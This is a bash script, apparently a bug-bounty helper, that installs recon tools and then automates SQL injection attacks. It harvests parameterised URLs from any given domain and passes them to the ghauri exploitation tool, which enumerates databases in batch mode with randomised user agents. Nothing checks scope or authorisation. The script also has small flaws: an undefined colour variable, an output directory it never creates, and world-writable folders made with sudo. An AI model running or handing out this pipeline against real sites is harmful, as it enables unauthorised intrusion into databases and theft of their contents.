#!/usr/bin/env bash
BOLD_BLUE="\033[1;34m"
RED="\033[0;31m"
NC="\033[0m"
BOLD_YELLOW="\033[1;33m"

# Function to display usage message
display_usage() {
    echo "Usage:"
    echo "     $0 -l http://example.com -tech 'T'"
    echo "     $0 -d http://example.com -tech 'B'"
    echo ""
    echo "Techniques: -tech, T, B, E, BB"
    echo "          -T      Time based sqli"
    echo "          -B      Blind sqli"
    echo "          -BB     Boolean based blind sqli"
    echo "          -E      Error sqli"
    echo ""
    echo "Options:"
    echo "  -h               Display this help message"
    echo "  -d               Single site scan"
    echo "  -l               Multiple site scan"
    echo "  -c               Installing required tools"
    echo "  -i               Check if required tools are installed"
    exit 0
}

# Check if help is requested
if [[ "$1" == "-h" ]]; then
    display_usage
    exit 0
fi

# Function to check installed tools
check_tools() {
    tools=("unfurl" "anew" "urlfinder" "ghauri" "iconv")

    echo "Checking required tools:"
    for tool in "${tools[@]}"; do
        if command -v "$tool" &> /dev/null; then
            echo -e "${BOLD_BLUE}$tool is installed at ${BOLD_WHITE}$(which $tool)${NC}"
        else
            echo -e "${RED}$tool is NOT installed or not in the PATH${NC}"
        fi
    done
}

# Check if tool installation check is requested
if [[ "$1" == "-i" ]]; then
    check_tools
    exit 0
fi

# Check if help is requested
if [[ "$1" == "-c" ]]; then
    mkdir -p --mode=777 sqlier
    cd sqlier
    sudo apt install unzip -y

    echo "urlfinder===================================="
    wget "https://github.com/projectdiscovery/urlfinder/releases/download/v0.0.3/urlfinder_0.0.3_linux_amd64.zip"
    unzip urlfinder_0.0.3_linux_amd64.zip
    sudo mv urlfinder /usr/local/bin/
    sudo chmod +x /usr/local/bin/urlfinder
    sudo rm -rf ./*
    urlfinder -h


    echo "anew=================================="
    wget "https://github.com/tomnomnom/anew/releases/download/v0.1.1/anew-linux-amd64-0.1.1.tgz"
    sudo tar -xzvf anew-linux-amd64-0.1.1.tgz
    sudo mv anew /usr/local/bin/
    sudo chmod +x /usr/local/bin/anew
    sudo rm -rf ./*
    anew -h

    echo "ghauri=================================="
    cd /opt/ && sudo git clone https://github.com/r0oth3x49/ghauri.git && cd ghauri/
    sudo chmod +x setup.py
    sudo python3 -m pip install --upgrade -r requirements.txt --break-system-packages
    sudo python3 -m pip install -e . --break-system-packages
    sudo python3 setup.py install
    cd
    ghauri -h
    cd sqlier

    echo "unfurl=================================="
    wget "https://github.com/tomnomnom/unfurl/releases/download/v0.4.3/unfurl-linux-amd64-0.4.3.tgz"
    sudo tar -xzvf unfurl-linux-amd64-0.4.3.tgz
    sudo mv unfurl /usr/local/bin/
    sudo chmod +x /usr/local/bin/unfurl
    sudo rm -rf ./*
    unfurl -h

    cd
    sudo rm -rf sqlier
    exit 0
fi


# Single Domain Scan SQLi
if [[ "$1" == "-d" && "$3" == "-tech" ]]; then
    domain_Without_Protocol=$(echo "$2" | unfurl -u domains)
    # making directory
    main_dir="bug_bounty/$domain_Without_Protocol"
    base_dir="$main_dir/single_domain/sql_injection"

    sudo mkdir -p --mode=777 $main_dir

    urlfinder -all -d "$domain_Without_Protocol" -fs fqdn | iconv -f ISO-8859-1 -t UTF-8 | grep -aE '\?.*=.*(&.*)?' | grep -aEi '\.(php|asp|aspx|jsp|cfm)' | anew $base_dir/all_params_urls.txt

    ghauri -m $base_dir/all_params_urls.txt --ignore-code=401 --level=3 --technique=$4 --random-agent --confirm --force-ssl --dbs --batch
    exit 0
fi

# Full server Scan SQLi
if [[ "$1" == "-l" && "$3" == "-tech" ]]; then
    domain_Without_Protocol=$(echo "$2" | unfurl -u domains)
    # making directory
    main_dir="bug_bounty/$domain_Without_Protocol"
    base_dir="$main_dir/single_domain/sql_injection"

    sudo mkdir -p --mode=777 $main_dir

    urlfinder -all -d "$domain_Without_Protocol" | iconv -f ISO-8859-1 -t UTF-8 | grep -aE '\?.*=.*(&.*)?' | grep -aEi '\.(php|asp|aspx|jsp|cfm)' | anew $base_dir/all_params_urls.txt

    ghauri -m $base_dir/all_params_urls.txt --ignore-code=401 --level=3 --technique=$4 --random-agent --confirm --force-ssl --dbs --batch
    exit 0
fi